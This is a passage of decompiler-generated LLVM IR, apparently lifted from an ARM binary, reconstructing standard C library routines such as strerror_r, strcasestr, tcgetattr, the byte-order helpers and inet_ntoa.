  %v2_16090 = icmp eq i32 %v0_16090, 0
  br i1 %v2_16090, label %dec_label_pc_160a0, label %dec_label_pc_15ff4

dec_label_pc_1609c:                               ; preds = %dec_label_pc_15fc0, %dec_label_pc_16014, %dec_label_pc_16000
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_160a0

dec_label_pc_160a0:                               ; preds = %dec_label_pc_16090, %dec_label_pc_16078, %dec_label_pc_16050, %entry, %dec_label_pc_15fd4, %dec_label_pc_1609c
  %v1_160a4 = phi i32 [ %v1_15fc0, %dec_label_pc_15fd4 ], [ 0, %dec_label_pc_1609c ], [ %v1_160a4.pre, %entry ], [ %v1_16048, %dec_label_pc_16050 ], [ %v1_16048, %dec_label_pc_16078 ], [ %v1_16048, %dec_label_pc_16090 ]
  ret i32 %v1_160a4

; uselistorder directives
  uselistorder i32 %v1_1606c, { 1, 0 }
  uselistorder i8 %v3_16028.pn, { 1, 0 }
  uselistorder i8* %v3_16028.pn.in, { 1, 0 }
  uselistorder i32 %storemerge41, { 3, 2, 6, 1, 4, 0, 5 }
  uselistorder i8 %v3_1601c, { 1, 0 }
  uselistorder i32 %v1_1601c, { 0, 2, 3, 1 }
  uselistorder i32 %v1_15fc0, { 0, 2, 3, 1 }
  uselistorder i8 %v3_15fb0, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 9, 5, 6, 3, 7, 8, 0, 1 }
  uselistorder label %dec_label_pc_160a0, { 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_1609c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16050, { 1, 0 }
  uselistorder label %dec_label_pc_16030, { 1, 0 }
  uselistorder label %dec_label_pc_16028, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16000, { 1, 0 }
  uselistorder label %dec_label_pc_16020.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_160b0 = call i32 @__xpg_strerror_r()
  %v0_160b4 = load i32, i32* @r4, align 4
  ret i32 %v0_160b4
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_160c0 = load i32, i32* @r4, align 4
  %v9_160c0 = load i32, i32* @r6, align 4
  %v0_160c8 = load i32, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r6, align 4
  store i32 %v0_160c8, i32* @ip, align 4
  %v0_160d8 = load i32, i32* @r1, align 4
  store i32 %v0_160d8, i32* @r7, align 4
  %v0_160dc = load i32, i32* @r2, align 4
  store i32 %v0_160dc, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_160c8, 124
  br i1 %tmp, label %dec_label_pc_16114, label %dec_label_pc_160e4

dec_label_pc_160e4:                               ; preds = %entry
  br label %dec_label_pc_160fc

dec_label_pc_160f0:                               ; preds = %dec_label_pc_160fc
  br i1 %v2_16108, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_160f0
  %v2_160f4 = add i32 %v1_1610c, -1
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_160f0, %bb
  %v0_160fc1 = phi i32 [ %v1_1610c, %dec_label_pc_160f0 ], [ %v2_160f4, %bb ]
  %v1_160f8 = add i32 %v0_160f8, 1
  br label %dec_label_pc_160fc

dec_label_pc_160fc:                               ; preds = %dec_label_pc_160e4, %bb15
  %v1_1610c = phi i32 [ %v0_160c8, %dec_label_pc_160e4 ], [ %v0_160fc1, %bb15 ]
  %v0_160f8 = phi i32 [ add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -38784), %dec_label_pc_160e4 ], [ %v1_160f8, %bb15 ]
  store i32 %v0_160f8, i32* @r5, align 4
  %v2_160fc = icmp eq i32 %v1_1610c, 0
  %v1_16100 = inttoptr i32 %v0_160f8 to i8*
  %v2_16100 = load i8, i8* %v1_16100, align 1
  %v3_16100 = zext i8 %v2_16100 to i32
  store i32 %v3_16100, i32* @r3, align 4
  %v2_16108 = icmp eq i8 %v2_16100, 0
  br i1 %v2_160fc, label %dec_label_pc_16108, label %dec_label_pc_160f0

dec_label_pc_16108:                               ; preds = %dec_label_pc_160fc
  br i1 %v2_16108, label %dec_label_pc_16114, label %bb16

bb16:                                             ; preds = %dec_label_pc_16108
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16150

dec_label_pc_16114:                               ; preds = %dec_label_pc_16108, %entry
  store i32 %v0_160c8, i32* @r2, align 4
  %v3_1611c = ashr i32 %v0_160c8, 31
  store i32 %v3_1611c, i32* @r3, align 4
  %v6_16130 = bitcast i32* %stack_var_-25 to i8*
  %v7_16130 = call i32 @_uintmaxtostr(i8* %v6_16130)
  %v1_16138 = add i32 %v7_16130, -14
  store i32 %v1_16138, i32* @r5, align 4
  %v0_1613c = load i32, i32* @r6, align 4
  %v2_1613c = add i32 %v0_1613c, -38800
  store i32 %v2_1613c, i32* @r1, align 4
  store i32 %v1_16138, i32* @r0, align 4
  store i32 14, i32* @r2, align 4
  %v0_16148 = call i32 @memcpy()
  store i32 22, i32* %r6.global-to-local, align 4
  %v0_16150.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16150

dec_label_pc_16150:                               ; preds = %bb16, %dec_label_pc_16114
  %v0_16150 = phi i32 [ %v0_160f8, %bb16 ], [ %v0_16150.pre, %dec_label_pc_16114 ]
  %v1_16150 = inttoptr i32 %v0_16150 to i8*
  %v3_16154 = call i32 @strlen(i8* %v1_16150)
  %v0_16158 = load i32, i32* @r7, align 4
  %v2_16158 = icmp eq i32 %v0_16158, 0
  br i1 %v2_16158, label %bb17, label %dec_label_pc_16150._crit_edge

dec_label_pc_16150._crit_edge:                    ; preds = %dec_label_pc_16150
  %v1_16164.pre = load i32, i32* @r4, align 4
  br label %bb18

bb17:                                             ; preds = %dec_label_pc_16150
  store i32 0, i32* @r4, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_16150._crit_edge, %bb17
  %v1_16164 = phi i32 [ %v1_16164.pre, %dec_label_pc_16150._crit_edge ], [ 0, %bb17 ]
  %v1_16160 = add i32 %v3_16154, 1
  %v3_16164 = icmp uge i32 %v1_16160, %v1_16164
  %v9_16164 = icmp eq i32 %v1_16160, %v1_16164
  %v2_16168 = xor i1 %v3_16164, true
  %v3_16168 = or i1 %v9_16164, %v2_16168
  br i1 %v3_16168, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 %v1_16160, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  %v0_16178 = phi i32 [ %v1_16164, %bb18 ], [ %v1_16160, %bb19 ]
  %v2_1616c = xor i1 %v9_16164, true
  %v3_1616c = and i1 %v3_16164, %v2_1616c
  br i1 %v3_1616c, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 34, i32* %r6.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v2_16170 = icmp eq i32 %v0_16178, 0
  br i1 %v2_16170, label %dec_label_pc_16194, label %dec_label_pc_16178

dec_label_pc_16178:                               ; preds = %bb22
  store i32 %v0_16178, i32* @r2, align 4
  %v0_1617c = load i32, i32* @r5, align 4
  store i32 %v0_1617c, i32* @r1, align 4
  store i32 %v0_16158, i32* @r0, align 4
  %v0_16184 = call i32 @memcpy()
  %v0_16188 = load i32, i32* @r4, align 4
  %v1_16188 = load i32, i32* @r7, align 4
  %v2_16188 = add i32 %v1_16188, %v0_16188
  %v3_16190 = add i32 %v2_16188, -1
  %v4_16190 = inttoptr i32 %v3_16190 to i8*
  store i8 0, i8* %v4_16190, align 1
  br label %dec_label_pc_16194

dec_label_pc_16194:                               ; preds = %bb22, %dec_label_pc_16178
  %v0_16194 = load i32, i32* %r6.global-to-local, align 4
  %v2_16194 = icmp eq i32 %v0_16194, 0
  br i1 %v2_16194, label %dec_label_pc_161ac, label %dec_label_pc_1619c

dec_label_pc_1619c:                               ; preds = %dec_label_pc_16194
  %v0_161a0 = call i32 @__aeabi_read_tp()
  %v3_161a4 = load i16, i16* @global_var_32088.1320, align 2
  %v4_161a4 = sext i16 %v3_161a4 to i32
  %v0_161a8 = load i32, i32* %r6.global-to-local, align 4
  %v3_161a8 = add i32 %v4_161a4, %v0_161a0
  %v4_161a8 = inttoptr i32 %v3_161a8 to i32*
  store i32 %v0_161a8, i32* %v4_161a8, align 4
  %v0_161ac.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_161ac

dec_label_pc_161ac:                               ; preds = %dec_label_pc_16194, %dec_label_pc_1619c
  %v0_161ac = phi i32 [ 0, %dec_label_pc_16194 ], [ %v0_161ac.pre, %dec_label_pc_1619c ]
  store i32 %v3_160c0, i32* @r4, align 4
  store i32 %v9_160c0, i32* %r6.global-to-local, align 4
  ret i32 %v0_161ac

; uselistorder directives
  uselistorder i1 %v3_16164, { 1, 0 }
  uselistorder i32 %v0_160f8, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1610c, { 1, 0, 2 }
  uselistorder i32 %v0_160c8, { 2, 1, 3, 0, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 3, 4, 5, 1, 2, 6 }
  uselistorder label %dec_label_pc_161ac, { 1, 0 }
  uselistorder label %dec_label_pc_16194, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_16150, { 1, 0 }
  uselistorder label %dec_label_pc_160fc, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_161d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_161ec23 = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_161ec.outer

dec_label_pc_161ec.outer:                         ; preds = %dec_label_pc_1622c, %entry
  %v0_1622c.ph = phi i32 [ %v1_1622c, %dec_label_pc_1622c ], [ %v0_161d8, %entry ]
  %v2_161ec24 = load i8, i8* %v1_161ec23, align 1
  %v2_161f026 = icmp eq i8 %v2_161ec24, 0
  br i1 %v2_161f026, label %bb, label %dec_label_pc_16204

bb:                                               ; preds = %dec_label_pc_161ec.backedge, %dec_label_pc_161ec.outer
  store i32 %v0_1622c.ph, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16240

dec_label_pc_16204:                               ; preds = %dec_label_pc_161ec.outer, %dec_label_pc_161ec.backedge
  %v1_161f832.in = phi i32 [ %v1_161f832, %dec_label_pc_161ec.backedge ], [ %arg2, %dec_label_pc_161ec.outer ]
  %v2_161ec30 = phi i8 [ %v2_161ec, %dec_label_pc_161ec.backedge ], [ %v2_161ec24, %dec_label_pc_161ec.outer ]
  %v2_161f431.in.in = phi i8 [ %v2_161ec, %dec_label_pc_161ec.backedge ], [ %v2_161ec24, %dec_label_pc_161ec.outer ]
  %v0_1621029 = phi i32 [ %v1_16210, %dec_label_pc_161ec.backedge ], [ %v0_1622c.ph, %dec_label_pc_161ec.outer ]
  %v1_161f832 = add i32 %v1_161f832.in, 1
  %v1_16204 = inttoptr i32 %v0_1621029 to i8*
  %v2_16204 = load i8, i8* %v1_16204, align 1
  %v3_16204 = zext i8 %v2_16204 to i32
  store i32 %v3_16204, i32* %r0.global-to-local, align 4
  %v9_16208 = icmp eq i8 %v2_161ec30, %v2_16204
  %v1_16210 = add i32 %v0_1621029, 1
  br i1 %v9_16208, label %dec_label_pc_161ec.backedge, label %dec_label_pc_16218

dec_label_pc_161ec.backedge:                      ; preds = %dec_label_pc_16204, %dec_label_pc_16218
  %v1_161ec = inttoptr i32 %v1_161f832 to i8*
  %v2_161ec = load i8, i8* %v1_161ec, align 1
  %v2_161f0 = icmp eq i8 %v2_161ec, 0
  br i1 %v2_161f0, label %bb, label %dec_label_pc_16204

dec_label_pc_16218:                               ; preds = %dec_label_pc_16204
  %v2_161f431.in = zext i8 %v2_161f431.in.in to i32
  %v2_1620c = mul nuw nsw i32 %v3_16204, 2
  %v2_161f431 = mul nuw nsw i32 %v2_161f431.in, 2
  %v4_16218 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 1144) to i32*), align 4
  %v2_1621c = add i32 %v4_16218, %v2_1620c
  %v3_1621c = inttoptr i32 %v2_1621c to i16*
  %v4_1621c = load i16, i16* %v3_1621c, align 2
  %v2_16220 = add i32 %v4_16218, %v2_161f431
  %v3_16220 = inttoptr i32 %v2_16220 to i16*
  %v4_16220 = load i16, i16* %v3_16220, align 2
  %v9_16224 = icmp eq i16 %v4_16220, %v4_1621c
  br i1 %v9_16224, label %dec_label_pc_161ec.backedge, label %dec_label_pc_1622c

dec_label_pc_1622c:                               ; preds = %dec_label_pc_16218
  %v1_1622c = add i32 %v0_1622c.ph, 1
  %v2_16230 = icmp eq i8 %v2_16204, 0
  br i1 %v2_16230, label %dec_label_pc_16240, label %dec_label_pc_161ec.outer

dec_label_pc_16240:                               ; preds = %dec_label_pc_1622c, %bb
  %v1_16244 = phi i32 [ %v0_1622c.ph, %bb ], [ 0, %dec_label_pc_1622c ]
  ret i32 %v1_16244

; uselistorder directives
  uselistorder i8 %v2_161ec, { 2, 1, 0 }
  uselistorder i32 %v0_1621029, { 1, 0 }
  uselistorder i32 %v0_1622c.ph, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_161ec.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_16204, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 25840), i32* @r2, align 4
  %v0_16268 = call i32 @strtok_r()
  ret i32 %v0_16268
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_16288 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_16288, i32* @r1, align 4
  %v0_1628c = call i32 @__GI_tcgetattr()
  %v1_16290 = sub i32 1, %v0_1628c
  %v2_16290 = icmp ult i32 %v0_1628c, 2
  br i1 %v2_16290, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_162a0 = phi i32 [ %v1_16290, %entry ], [ 0, %bb ]
  ret i32 %v1_162a0

; uselistorder directives
  uselistorder i32 %v0_1628c, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_162a4 = load i32, i32* @r4, align 4
  %v6_162a4 = load i32, i32* @r5, align 4
  %v9_162a4 = load i32, i32* @r6, align 4
  %v2_162ac = ptrtoint i32* %stack_var_-52 to i32
  %v0_162b0 = load i32, i32* @r1, align 4
  store i32 %v0_162b0, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_162bc = load i32, i32* @r0, align 4
  %v3_162bc = call i32 @ioctl(i32 %v0_162bc, i32 21505, i32 %v2_162ac)
  store i32 %v3_162bc, i32* %r0.global-to-local, align 4
  store i32 %v3_162bc, i32* @r5, align 4
  %v2_162c0 = icmp eq i32 %v3_162bc, 0
  br i1 %v2_162c0, label %dec_label_pc_162c8, label %dec_label_pc_1630c

dec_label_pc_162c8:                               ; preds = %entry
  %v4_162d4 = zext i8 %tmp to i32
  store i32 %v4_162d4, i32* @ip, align 4
  %v3_162d8 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_162d8, i32* @r3, align 4
  %v1_162dc = load i32, i32* @r4, align 4
  %v2_162dc = add i32 %v1_162dc, 4
  %v3_162dc = inttoptr i32 %v2_162dc to i32*
  %v0_162e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_162e0 = load i32, i32* @r4, align 4
  %v2_162e0 = add i32 %v1_162e0, 8
  %v3_162e0 = inttoptr i32 %v2_162e0 to i32*
  store i32 %v0_162e0, i32* %v3_162e0, align 4
  %v0_162e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_162e4 = load i32, i32* @r4, align 4
  %v2_162e4 = add i32 %v1_162e4, 12
  %v3_162e4 = inttoptr i32 %v2_162e4 to i32*
  store i32 %v0_162e4, i32* %v3_162e4, align 4
  %v2_162e8 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_162e8, i32* @r1, align 4
  %v1_162f0 = load i32, i32* @r4, align 4
  %v2_162f0 = inttoptr i32 %v1_162f0 to i32*
  store i32 %v3_162d8, i32* %v2_162f0, align 4
  %v0_162f4 = load i32, i32* @ip, align 4
  %v1_162f4 = trunc i32 %v0_162f4 to i8
  %v2_162f4 = load i32, i32* @r4, align 4
  %v3_162f4 = add i32 %v2_162f4, 16
  %v4_162f4 = inttoptr i32 %v3_162f4 to i8*
  store i8 %v1_162f4, i8* %v4_162f4, align 1
  %v0_162f8 = load i32, i32* @r4, align 4
  %v1_162f8 = add i32 %v0_162f8, 17
  store i32 %v1_162f8, i32* %r0.global-to-local, align 4
  %v4_162fc = call i32 @__GI_mempcpy(i32 %v1_162f8, i32 %v2_162e8, i32 19, i32 %v3_162d8)
  store i32 %v4_162fc, i32* %r0.global-to-local, align 4
  %v0_16300 = load i32, i32* @r5, align 4
  store i32 %v0_16300, i32* %r1.global-to-local, align 4
  %v3_16308 = inttoptr i32 %v4_162fc to i8*
  %v4_16308 = call i32 @__GI_memset(i8* %v3_16308, i32 %v0_16300, i32 13)
  store i32 %v4_16308, i32* %r0.global-to-local, align 4
  %v0_1630c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1630c

dec_label_pc_1630c:                               ; preds = %entry, %dec_label_pc_162c8
  %v0_1630c = phi i32 [ %v3_162bc, %entry ], [ %v0_1630c.pre, %dec_label_pc_162c8 ]
  store i32 %v0_1630c, i32* %r0.global-to-local, align 4
  store i32 %v3_162a4, i32* @r4, align 4
  store i32 %v6_162a4, i32* @r5, align 4
  store i32 %v9_162a4, i32* @r6, align 4
  ret i32 %v0_1630c

; uselistorder directives
  uselistorder i32 %v0_1630c, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder label %dec_label_pc_1630c, { 1, 0 }
}

define i32 @__GI_htons(i32 %arg1) local_unnamed_addr {
entry:
  %v3_16320 = udiv i32 %arg1, 256
  %v1_16324 = mul i32 %arg1, 256
  %v4_16328 = and i32 %v1_16324, 65280
  %v5_16328 = or i32 %v4_16328, %v3_16320
  ret i32 %v5_16328
}

define i32 @__GI_htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_16348 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_16348
}

define i32 @__GI_ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v3_16350 = udiv i32 %arg1, 256
  %v1_16354 = mul i32 %arg1, 256
  %v4_16358 = and i32 %v1_16354, 65280
  %v5_16358 = or i32 %v4_16358, %v3_16350
  ret i32 %v5_16358
}

define i32 @__GI_ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_16378 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_16378
}

define i32 @hstrerror(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, 5
  br i1 %tmp, label %dec_label_pc_163a0, label %dec_label_pc_16394

dec_label_pc_16394:                               ; preds = %entry
  ret i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -35760)

dec_label_pc_163a0:                               ; preds = %entry
  %v4_163a8 = mul i32 %arg1, 4
  %v5_163a8 = add i32 %v4_163a8, add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -20)
  %v6_163a8 = inttoptr i32 %v5_163a8 to i32*
  %v7_163a8 = load i32, i32* %v6_163a8, align 4
  ret i32 %v7_163a8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_herror(i8* %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v3_163c4 = icmp eq i8* %arg1, null
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r2.global-to-local, align 4
  br i1 %v3_163c4, label %dec_label_pc_163e8, label %dec_label_pc_163d4

dec_label_pc_163d4:                               ; preds = %entry
  %v2_163d4 = load i8, i8* %arg1, align 1
  %v2_163d8 = icmp eq i8 %v2_163d4, 0
  br i1 %v2_163d8, label %dec_label_pc_163e8, label %dec_label_pc_163f4

dec_label_pc_163e8:                               ; preds = %dec_label_pc_163d4, %entry
  br label %dec_label_pc_163f4

dec_label_pc_163f4:                               ; preds = %dec_label_pc_163d4, %dec_label_pc_163e8
  %storemerge = phi i32 [ add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -35742), %dec_label_pc_163e8 ], [ add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -35744), %dec_label_pc_163d4 ]
  store i32 %storemerge, i32* @r5, align 4
  %v0_163f8 = call i32 @__aeabi_read_tp()
  %v3_163fc = load i32, i32* @global_var_32044.1421, align 4
  %v2_16400 = add i32 %v3_163fc, %v0_163f8
  %v3_16400 = inttoptr i32 %v2_16400 to i32*
  %v4_16400 = load i32, i32* %v3_16400, align 4
  %v2_16404 = icmp ugt i32 %v4_16400, 3
  %v7_16404 = icmp eq i32 %v4_16400, 4
  %v2_16408 = xor i1 %v7_16404, true
  %v3_16408 = and i1 %v2_16404, %v2_16408
  br i1 %v3_16408, label %bb, label %.thread9

bb:                                               ; preds = %dec_label_pc_163f4
  %v4_1640c = load i32, i32* %r2.global-to-local, align 4
  %v6_1640c = add i32 %v4_1640c, -35760
  store i32 %v6_1640c, i32* @ip, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_163f4, %bb
  %v2_16410 = xor i1 %v2_16404, true
  %v3_16410 = or i1 %v7_16404, %v2_16410
  br i1 %v3_16410, label %bb22, label %._crit_edge

._crit_edge:                                      ; preds = %.thread9
  %v0_16438.pre = load i32, i32* @ip, align 4
  %v0_16424.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb23

bb22:                                             ; preds = %.thread9
  %v4_16414 = load i32, i32* %r2.global-to-local, align 4
  %v6_16414 = add i32 %v4_16414, -20
  %v8_16418 = mul i32 %v4_16400, 4
  %v9_16418 = add i32 %v6_16414, %v8_16418
  %v10_16418 = inttoptr i32 %v9_16418 to i32*
  %v11_16418 = load i32, i32* %v10_16418, align 4
  store i32 %v11_16418, i32* @ip, align 4
  br label %bb23

bb23:                                             ; preds = %._crit_edge, %bb22
  %v0_16424 = phi i32 [ %v0_16424.pre, %._crit_edge ], [ %v4_16414, %bb22 ]
  %v0_16438 = phi i32 [ %v0_16438.pre, %._crit_edge ], [ %v11_16418, %bb22 ]
  %v2_16424 = add i32 %v0_16424, 152
  %v3_16424 = inttoptr i32 %v2_16424 to i32*
  %v4_16424 = load i32, i32* %v3_16424, align 4
  %v2_16428 = add i32 %v0_16424, -35876
  %v1_1642c = inttoptr i32 %v4_16424 to i32*
  %v2_1642c = load i32, i32* %v1_1642c, align 4
  store i32 %v2_1642c, i32* @r0, align 4
  %v0_16430 = load i32, i32* @r4, align 4
  store i32 %v0_16430, i32* %r2.global-to-local, align 4
  %v0_16434 = load i32, i32* @r5, align 4
  %v6_1643c = call i32 @fprintf(i32 %v2_1642c, i32 %v2_16428, i32 %v0_16430, i32 %v0_16434, i32 %v0_16438)
  ret i32 %v6_1643c

; uselistorder directives
  uselistorder i32 %v0_16424, { 1, 0 }
  uselistorder i1 %v7_16404, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32 152, { 1, 0, 3, 2 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_163f4, { 1, 0 }
}

define i32 @__GI_inet_ntoa_r() local_unnamed_addr {
entry:
  %v3_16468 = load i32, i32* @r4, align 4
  %v6_16468 = load i32, i32* @r5, align 4
  %v9_16468 = load i32, i32* @r6, align 4
  %v12_16468 = load i32, i32* @r7, align 4
  %v15_16468 = load i32, i32* @r8, align 4
  %v18_16468 = load i32, i32* @sb, align 4
  %v21_16468 = load i32, i32* @sl, align 4
  %v24_16468 = load i32, i32* @fp, align 4
  %v0_1646c = load i32, i32* @r0, align 4
  %v5_16488 = call i32 @llvm.bswap.i32(i32 %v0_1646c)
  %v0_1648c = load i32, i32* @r1, align 4
  %v1_1648c = add i32 %v0_1648c, 15
  store i32 %v1_1648c, i32* @r1, align 4
  store i32 0, i32* @r6, align 4
  store i32 255, i32* @r7, align 4
  store i32 46, i32* @sl, align 4
  br label %dec_label_pc_164c8

dec_label_pc_164ac:                               ; preds = %dec_label_pc_164c8
  %v1_164b4 = inttoptr i32 %v0_164e4 to i8*
  %v2_164b4 = call i32 @_uintmaxtostr(i8* %v1_164b4)
  %v0_164b8 = load i32, i32* @r6, align 4
  %v2_164b8 = icmp eq i32 %v0_164b8, 0
  %v1_164bc = add i32 %v2_164b4, -1
  store i32 %v1_164bc, i32* @r1, align 4
  br i1 %v2_164b8, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_164ac
  %v1_164c0 = load i32, i32* @sl, align 4
  %v2_164c0 = trunc i32 %v1_164c0 to i8
  %v4_164c0 = inttoptr i32 %v0_164b8 to i8*
  store i8 %v2_164c0, i8* %v4_164c0, align 1
  %v0_164c4.pre = load i32, i32* @r1, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_164ac, %bb
  %v0_164c4 = phi i32 [ %v1_164bc, %dec_label_pc_164ac ], [ %v0_164c4.pre, %bb ]
  store i32 %v0_164c4, i32* @r6, align 4
  %v0_164c8.pre = load i32, i32* @r5, align 4
  %v0_164cc.pre = load i32, i32* @r7, align 4
  %v1_164cc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_164c8

dec_label_pc_164c8:                               ; preds = %entry, %bb17
  %v0_164e4 = phi i32 [ %v1_1648c, %entry ], [ %v0_164c4, %bb17 ]
  %v1_164cc = phi i32 [ %v5_16488, %entry ], [ %v1_164cc.pre, %bb17 ]
  %v0_164cc = phi i32 [ 255, %entry ], [ %v0_164cc.pre, %bb17 ]
  %v0_164dc = phi i32 [ 0, %entry ], [ %v0_164c8.pre, %bb17 ]
  %v7_164c8 = icmp eq i32 %v0_164dc, 3
  store i1 %v7_164c8, i1* @cpsr_z, align 1
  %v2_164cc = and i32 %v0_164cc, %v1_164cc
  store i32 %v2_164cc, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v3_164d8 = udiv i32 %v1_164cc, 256
  store i32 %v3_164d8, i32* @r4, align 4
  %v1_164dc = add i32 %v0_164dc, 1
  store i32 %v1_164dc, i32* @r5, align 4
  %v7_164e0 = icmp sgt i32 %v0_164dc, 3
  br i1 %v7_164e0, label %dec_label_pc_164e4, label %dec_label_pc_164ac

dec_label_pc_164e4:                               ; preds = %dec_label_pc_164c8
  %v1_164e4 = add i32 %v0_164e4, 1
  store i32 %v3_16468, i32* @r4, align 4
  store i32 %v6_16468, i32* @r5, align 4
  store i32 %v9_16468, i32* @r6, align 4
  store i32 %v12_16468, i32* @r7, align 4
  store i32 %v15_16468, i32* @r8, align 4
  store i32 %v18_16468, i32* @sb, align 4
  store i32 %v21_16468, i32* @sl, align 4
  store i32 %v24_16468, i32* @fp, align 4
  ret i32 %v1_164e4

; uselistorder directives
  uselistorder i32 %v0_164dc, { 2, 0, 1 }
  uselistorder i32 %v0_164c4, { 1, 0 }
  uselistorder i32 (i8*)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_164c8, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 25844), i32* @r1, align 4
  %v0_16504 = call i32 @__GI_inet_ntoa_r()
  store i32 %v0_16504, i32* %r0.global-to-local, align 4
  %v0_16508 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16508, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v1_16508 = load i32, i32* @r1, align 4
  %v5_16508 = udiv i32 %v0_16504, 4194304
  %v6_16508 = and i32 %v1_16508, %v5_16508
  store i32 %v6_16508, i32* @fp, align 4
  %v1_1650c = load i32, i32* @r6, align 4
  %v4_1650c = inttoptr i32 %v0_16504 to i32*
  store i32 %v1_1650c, i32* %v4_1650c, align 4
  %v5_1650c = load i32, i32* @r4, align 4
  %v6_1650c = load i32, i32* %r0.global-to-local, align 4
  %v7_1650c = sub i32 %v6_1650c, %v5_1650c
  store i32 %v7_1650c, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v8_1650c = phi i32 [ %v0_16504, %entry ], [ %v7_1650c, %bb ]
  ret i32 %v8_1650c

; uselistorder directives
